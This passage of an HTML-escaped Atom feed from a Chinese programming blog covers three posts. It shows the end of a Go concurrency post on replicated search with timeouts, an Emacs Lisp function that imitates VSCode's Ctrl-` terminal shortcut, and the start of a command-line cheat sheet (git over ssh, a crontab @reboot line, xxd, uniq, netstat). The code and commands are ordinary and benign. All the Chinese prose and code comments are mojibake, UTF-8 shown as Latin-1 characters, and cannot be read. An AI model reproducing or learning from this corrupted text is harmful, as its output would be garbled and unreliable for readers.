&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(){&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">Image&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(){&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">Video&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">timeout&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">After&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">80&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Millisecond&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">select&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="nx">result&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">results&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">timeout&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;timed out&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="search-3-dot-0">Search 3.0&lt;/h3>
&lt;p>é€šè¿‡åç«¯æœåŠ¡å¤šå¼€ï¼ˆreplicatedï¼‰ï¼Œé™ä½å°¾éƒ¨å»¶è¿Ÿï¼ˆtail latencyï¼‰ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">First&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">replicas&lt;/span> &lt;span class="o">...&lt;/span>&lt;span class="nx">Search&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">Result&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">c&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="nx">Result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">searchReplica&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">replicas&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">replicas&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="nf">searchReplica&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">Google&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">Result&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">c&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="nx">Result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">First&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Web1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Web2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">First&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Image1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Image2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nf">First&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Video1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Video2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">timeout&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">After&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">80&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Millisecond&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">select&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="nx">result&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">results&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">timeout&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;timed out&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://talks.golang.org/2012/concurrency.slide#1">Go Concurrency Patterns - slide&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://cs.opensource.google/go/x/website/+/master:_content/talks/2012/concurrency.slide">Go Concurrency Patterns - source code of slide&lt;/a>&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/golang/" term="Golang" label="Golang"/><category scheme="https://mincodes.com/tags/concurrency/" term="Concurrency" label="Concurrency"/></entry><entry><title type="text">åœ¨ Emacs ä¸­å®ç° VSCode çš„ terminal å¿«æ·é”®åŠŸèƒ½</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/emacs-vscode-terminal/"/><id>https://mincodes.com/posts/emacs-vscode-terminal/</id><updated>2024-03-20T09:34:26+00:00</updated><published>2022-03-09T00:00:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">VSCode æœ‰ä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„å¿«æ·é”®ï¼šCtrl-` ï¼Œå¯ä»¥ä¸€é”®æ‹‰èµ· terminal ã€‚ è¿™é‡Œåœ¨ Emacs ä¸­æ¨¡æ‹Ÿä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½ï¼Œè€Œä¸”è¿˜æ˜¯å¢å¼ºç‰ˆæœ¬â€¦</summary><content type="html">&lt;p>VSCode æœ‰ä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„å¿«æ·é”®ï¼šCtrl-` ï¼Œå¯ä»¥ä¸€é”®æ‹‰èµ· terminal ã€‚&lt;/p>
&lt;p>è¿™é‡Œåœ¨ Emacs ä¸­æ¨¡æ‹Ÿä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½ï¼Œè€Œä¸”è¿˜æ˜¯å¢å¼ºç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨ä¸åŒæ–‡ä»¶ä¸­æ‹‰
èµ·ä¸åŒçš„ terminalï¼Œæ‹‰èµ·çš„ terminal è·¯å¾„å’Œå½“å‰æ–‡ä»¶çš„ç›®å½•ä¸€è‡´ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; emacs è‡ªå¸¦çš„ term å‘½ä»¤åªæ”¯æŒå•ä¸ª terminalï¼Œå› æ­¤è¯¥åŠŸèƒ½ä¾èµ–&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; multi-term ã€‚è¿™é‡Œå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰å®‰è£…ï¼Œæ²¡æœ‰çš„è¯å…ˆå®‰è£… multi-term&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">unless&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">package-installed-p&lt;/span> &lt;span class="ss">&amp;#39;multi-term&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">package-install&lt;/span> &lt;span class="ss">&amp;#39;multi-term&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; å®šä¹‰æ‹‰èµ· multi-term çš„å‡½æ•°ï¼Œå¦‚æœå½“å‰ç›®å½•å·²ç»æ‹‰èµ·è¿‡ terminalï¼Œåˆ™ç›´æ¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; è·³è½¬åˆ°è¯¥ terminalã€‚ç”±äºæˆ‘çš„å±å¹•æ¯”è¾ƒå®½ï¼Œè¿™é‡Œä¼šè‡ªåŠ¨å°† terminal åˆ†å±åˆ°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; å³ä¾§&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">defun&lt;/span> &lt;span class="nv">open-or-jump-to-multi-term&lt;/span> &lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">interactive&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">string-prefix-p&lt;/span> &lt;span class="s">&amp;#34;*terminal&amp;lt;&amp;#34;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">buffer-name&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">delete-window&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">progn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">setq&lt;/span> &lt;span class="nv">bufname&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">concat&lt;/span> &lt;span class="s">&amp;#34;*terminal&amp;lt;&amp;#34;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">directory-file-name&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">file-name-directory&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">buffer-file-name&lt;/span>&lt;span class="p">)))&lt;/span> &lt;span class="s">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">get-buffer-process&lt;/span> &lt;span class="nv">bufname&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">switch-to-buffer-other-window&lt;/span> &lt;span class="nv">bufname&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">progn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">split-window-right&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">other-window&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">multi-term&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">rename-buffer&lt;/span> &lt;span class="nv">bufname&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">;; å®šä¹‰å¿«æ·é”®ï¼Œå’Œ VSCode ä¸€è‡´&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nv">global-set-key&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">kbd&lt;/span> &lt;span class="s">&amp;#34;C-`&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ss">&amp;#39;open-or-jump-to-multi-term&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Emacs æœ€å¤§çš„é­…åŠ›ï¼Œä¹Ÿè®¸å°±æ˜¯å¯ä»¥æŒ‰ç…§è‡ªå·±çš„å–œå¥½ï¼Œéšå¿ƒå®šåˆ¶å„ç§åŠŸèƒ½å§ï¼å¦å¤–
å„ç§æ–‡æœ¬ç¼–è¾‘çš„å¿«æ·é”®ï¼Œä¹Ÿæ˜¯è¶Šç”¨è¶Šé¡ºæ‰‹ã€‚&lt;/p></content><category scheme="https://mincodes.com/tags/emacs/" term="Emacs" label="Emacs"/><category scheme="https://mincodes.com/tags/elisp/" term="Elisp" label="Elisp"/><category scheme="https://mincodes.com/tags/terminal/" term="Terminal" label="Terminal"/><category scheme="https://mincodes.com/tags/vscode/" term="Vscode" label="Vscode"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/></entry><entry><title type="text">å¸¸ç”¨å‘½ä»¤è¡Œå·¥å…·</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/cmd-line-tools/"/><id>https://mincodes.com/posts/cmd-line-tools/</id><updated>2024-03-20T09:34:26+00:00</updated><published>2022-02-22T00:00:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">è®°å½•ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ–¹ä¾¿éšæ—¶å–ç”¨ã€‚ git throught ssh 1 git remote add origin ssh://user@my.git.svr/path/to/repo é€šè¿‡ crontab å®ç°å¼€æœºè‡ªå¯åŠ¨ # æ¯æ¬¡ç³»ç»Ÿé‡å¯æ—¶ï¼Œéƒ½ä¼šâ€¦</summary><content type="html">&lt;p>è®°å½•ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ–¹ä¾¿éšæ—¶å–ç”¨ã€‚&lt;/p>
&lt;h2 id="git-throught-ssh">git throught ssh&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">git remote add origin ssh://user@my.git.svr/path/to/repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="é€šè¿‡-crontab-å®ç°å¼€æœºè‡ªå¯åŠ¨">é€šè¿‡ crontab å®ç°å¼€æœºè‡ªå¯åŠ¨&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-crontab" data-lang="crontab"># æ¯æ¬¡ç³»ç»Ÿé‡å¯æ—¶ï¼Œéƒ½ä¼šè¿è¡Œ ss.sh
@reboot ss.sh
&lt;/code>&lt;/pre>&lt;h2 id="xxd-åå…­è¿›åˆ¶-äºŒè¿›åˆ¶-dump">xxd åå…­è¿›åˆ¶ï¼ˆäºŒè¿›åˆ¶ï¼‰ dump&lt;/h2>
&lt;dl>
&lt;dt>xxd&lt;/dt>
&lt;dd>ä»¥åå…­è¿›åˆ¶å½¢å¼ dump æ–‡ä»¶å†…å®¹&lt;/dd>
&lt;dt>xxd -b&lt;/dt>
&lt;dd>ä»¥äºŒè¿›åˆ¶å½¢å¼ dump æ–‡ä»¶å†…å®¹&lt;/dd>
&lt;dt>xxd -r&lt;/dt>
&lt;dd>ä» dump å†…å®¹è¿˜åŸå‡ºåŸå§‹æ–‡ä»¶ï¼Œä¾‹å¦‚ &lt;code>xxd file | xxd -r&lt;/code> å’Œ
&lt;code>cat file&lt;/code> çš„è¾“å‡ºæ˜¯ä¸€è‡´çš„&lt;/dd>
&lt;/dl>
&lt;h2 id="uniq-è¿‡æ»¤-æŠ¥å‘Šç›¸åŒè¡Œ">uniq è¿‡æ»¤ã€æŠ¥å‘Šç›¸åŒè¡Œ&lt;/h2>
&lt;dl>
&lt;dt>uniq&lt;/dt>
&lt;dd>ç›¸åŒè¡Œä»…æ‰“å°ä¸€æ¬¡&lt;/dd>
&lt;dt>uniq -c&lt;/dt>
&lt;dd>è¡Œé¦–æ’å…¥è¯¥è¡Œé‡å¤å‡ºç°çš„æ¬¡æ•°&lt;/dd>
&lt;dt>uniq -d&lt;/dt>
&lt;dd>ä»…è¾“å‡ºç›¸åŒè¡Œ&lt;/dd>
&lt;dt>uniq -u&lt;/dt>
&lt;dd>ä»…è¾“å‡ºä¸åŒè¡Œ&lt;/dd>
&lt;/dl>
&lt;h2 id="æŸ¥çœ‹ç½‘ç»œç«¯å£ç›‘å¬æƒ…å†µ">æŸ¥çœ‹ç½‘ç»œç«¯å£ç›‘å¬æƒ…å†µ&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">netstat -tunlp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æŸ¥çœ‹-cpu-æ€»æ ¸å¿ƒæ•°">æŸ¥çœ‹ CPU æ€»æ ¸å¿ƒæ•°&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
